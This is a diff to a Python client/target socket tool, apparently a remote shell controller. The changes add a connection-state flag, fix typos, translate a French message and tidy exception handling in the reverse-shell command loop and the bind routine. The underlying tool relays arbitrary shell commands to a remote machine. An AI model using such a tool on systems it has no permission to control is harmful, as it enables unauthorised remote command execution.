@@ -24,14 +24,16 @@ class Client(Machine):
         super().__init__()
         self.host = host
         self.port = port
+        self.connection_active = False
 
     def connect_to_server(self):
         self.s.connect((self.host, self.port))
+        self.connection_active = True
 
     def reverse_shell_send_command(self):
         try:
             self.s.send(str.encode("shell"))
-            print("Welcome into the Shell Monitor: \n")
+            print("Welcome into the Shell Monitor: \nTo leave write \"quit\"\n")
             print("-->", end=" ")
             while True:
                 cmd = input("")
@@ -43,9 +45,8 @@ class Client(Machine):
                         break
         except ConnectionResetError:
             self.quit()
-        except OSError as msg:
-            print("s n'est plus un socket")
-
+        except OSError:
+            print("S isn't a socket anymore. The connection should be already closed")
 
     def getinfo(self, info):
         try:
@@ -73,12 +74,15 @@ class Client(Machine):
             self.quit()
 
     def quit(self):
+        self.connection_active = False
         try:
             self.s.send(str.encode("quit"))
             response_target = self.s.recv(self.buffer)
             print(response_target.decode("utf-8"))
-        except ConnectionResetError as msg:
-            print("We notice that the connection is closed.. \nError: " + str(msg))
+        except ConnectionResetError:
+            print("We notice that the connection is closed..")
+        except OSError:
+            print("Closed")
         super().quit()
 
 
@@ -96,7 +100,7 @@ class Target(Machine):
     # bind de socket with the port
     def socket_bind(self):
         if self.print:
-            print("Bidding socket to port " + str(self.port))
+            print("Binding socket to port " + str(self.port))
         try:
             self.s.bind((self.host, self.port))
             self.s.listen(5)
